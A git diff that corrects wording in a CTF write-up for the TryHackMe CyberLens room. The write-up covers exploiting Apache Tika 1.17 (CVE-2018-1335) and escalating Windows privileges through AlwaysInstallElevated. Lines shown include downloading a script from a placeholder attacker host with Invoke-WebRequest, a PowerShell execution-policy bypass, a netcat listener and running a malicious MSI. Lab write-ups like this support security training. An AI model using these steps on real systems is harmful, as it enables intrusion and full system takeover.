@@ -13,7 +13,7 @@ mermaid: true
 # Summary
 >
 > - Port 61777 open ==> Apache Tika 1.17 Server ==> CVE-2018-1335
-> - Use metasploit exploit user
+> - Use Metasploit exploit user
 > - Use PrivescCheck.ps1, check Windows Privilege Escalation  
 > - AlwaysInstallElevated vuln
 
@@ -43,7 +43,7 @@ PORT      STATE SERVICE       REASON  VERSION
 
 After enumeration port 80, nothing interested.  
 
-Continous enumeration port 61777, we can see Apache Tika 1.17 Server.
+Continuous enumeration port 61777, we can see Apache Tika 1.17 Server.
 
 ![](/commons/THM/CyberLens/0_Apache_Tika_1.17_Server.png)
 
@@ -60,13 +60,11 @@ Worked.
 
 ## Privilege Escalation
 
-This tool can find in Github [PrivescCheck.ps1](https://github.com/itm4n/PrivescCheck).
+This tool is available on GitHub [PrivescCheck.ps1](https://github.com/itm4n/PrivescCheck).
 
-We can use curl to upload PrivescCheck.ps1 to victim via powershell.
-
-In this case. I run local server with `python3 -m http.server 80` to host PrivescCheck.ps1 file.
-
-In victim machine, we get .ps1 via `Invoke-WebRequest -Uri http://attack_IP:port/PrivescCheck.ps1 -Outfile PrivescCheck.ps1`
+We can use curl to upload PrivescCheck.ps1 to the victim via Powershell.  
+In this case. I run the local server with `python3 -m http.server 80` to host PrivescCheck.ps1 file.  
+In victim machine, we get .ps1 via `Invoke-WebRequest -Uri http://attack_IP:port/PrivescCheck.ps1 -Outfile PrivescCheck.ps1`  
 
 Run tools:
 
@@ -74,7 +72,7 @@ Run tools:
 powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"
 ```
 
-We found a vuln that can be exploit.
+We found a vuln that can be exploited.
 
 ![](/commons/THM/CyberLens/2_Always_Install_Elevated.png)
 
@@ -88,9 +86,9 @@ And upload from local.
 
 In another terminal, listen on port 443 `sudo nc -nlvp 443`
 
-After get evil.msi in victim from local.
+After getting evil.msi in victim from local.
 
-Just run file. And we got system.
+Just run the file. And we got the system.
 ![](/commons/THM/CyberLens/3_Root.png)
 
 ***GOT ADMIN.TXT FLAG***
